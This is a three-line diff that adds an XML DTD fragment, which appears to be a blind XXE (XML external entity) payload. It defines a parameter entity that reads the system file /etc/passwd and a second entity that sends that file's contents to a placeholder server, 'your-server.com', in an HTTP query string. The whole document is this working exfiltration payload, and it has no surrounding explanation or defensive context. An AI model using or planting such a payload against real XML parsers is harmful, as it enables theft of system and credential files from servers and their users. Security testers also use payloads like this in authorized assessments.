@@ -1,0 +1,3 @@
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY hack SYSTEM 'http://your-server.com/?%data;'>">
+%param1;
